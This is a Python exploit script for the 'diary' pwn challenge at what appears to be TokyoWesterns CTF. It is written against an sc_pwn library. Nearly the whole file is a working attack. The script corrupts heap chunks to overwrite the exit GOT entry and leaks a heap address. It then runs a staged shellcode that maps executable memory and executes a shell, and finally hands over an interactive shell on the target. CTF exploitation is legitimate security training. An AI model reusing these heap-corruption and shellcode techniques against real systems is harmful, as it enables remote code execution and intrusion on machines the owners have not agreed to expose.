#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.138','port':8080}, \
                        remote  = {'host':'pwn1.chal.ctf.westerns.tokyo','port':13856})
env.select()

binf = ELF('diary')
addr_got_exit   = binf.got('exit')

addr_buf_stager = 0x80000000
addr_buf_flag   = 0x60000000
addr_buf_stack  = 0xffff0000

#==========
def attack(cmn):
    #==========
    
    sc = ShellCode('amd64')
    shellcode_st2  = sc.change_cpu_mode('x86')
    shellcode_st2 += sc.reset_stack(addr_buf_stack, 0x1000)
    shellcode_st2 += '\x68sh\x00\x00'               # push    sh
    shellcode_st2 += '\x68./ba'                     # push    ./ba
    shellcode_st2 += '\x89\xe3'                     # mov     ebx, esp
    shellcode_st2 += sc.execve(None,NULL,NULL)
    shellcode_st2 += sc.exit(0)

    sc = ShellCode('amd64')
    shellcode_st1  = '\xe9\x0b\x00\x00\x00'             # jmp 0x10
    shellcode_st1 += '\x90'*(0x10-len(shellcode_st1))   # <- overwritten with addr_got_exit-0x10
    shellcode_st1 += sc.mmap(addr_buf_stager, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    shellcode_st1 += sc.stager(buf=addr_buf_stager, size=len(shellcode_st2))

    #==========
    register(cmn, '1970/1/1', 'aaaa', 0x10)
    register(cmn, '1970/1/2', 'bbbb', 0x10)
    register(cmn, '1970/1/3', shellcode_st1, len(shellcode_st1))

    delete(cmn, '1970/1/1')
    delete(cmn, '1970/1/2')
    register(cmn, '1970/2/1', '!', 0x60)
    addr_heap       = show(cmn, '1970/2/1')
    addr_heap       = unpack_64(addr_heap+'\x00'*(8-len(addr_heap)))&~0xfff
    addr_shellcode  = addr_heap + 0xc0
    info('addr_heap     = 0x%x' % addr_heap)

    exploit  = 'C'* 0x10
    exploit += pack_64(0x21)
    exploit += pack_64(addr_got_exit-0x10)
    exploit += pack_64(addr_shellcode)
    exploit += pack_64(0x20)
    exploit += pack_64(0x0)
    
    register(cmn, '1970/3/1', '1111', 0x18)
    register(cmn, '1970/3/2', exploit, len(exploit))
    delete(cmn, '1970/3/1')
    register(cmn, '1970/3/3', 'B'*0x18+'\x41', 0x18)
    delete(cmn, '1970/3/2')

    cmn.read_until('>> ')
    cmn.sendln('0')
    
    cmn.read_until('Bye!\n')
    cmn.send(shellcode_st2)
    
def register(cmn, date, content, size):
    cmn.read_until('>> ')
    cmn.sendln('1')

    cmn.read_until('Input date')
    cmn.sendln(date)
    cmn.read_until('size... ')
    cmn.sendln(str(size))
    cmn.read_until('what happened on')
    cmn.send(content)

def show(cmn, date):
    cmn.read_until('>> ')
    cmn.sendln('2')

    cmn.read_until('Input date')
    cmn.sendln(date)
    cmn.read_until()
    return cmn.read_until('\n', False)

def delete(cmn, date):
    cmn.read_until('>> ')
    cmn.sendln('3')

    cmn.read_until('Input date')
    cmn.sendln(date)

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
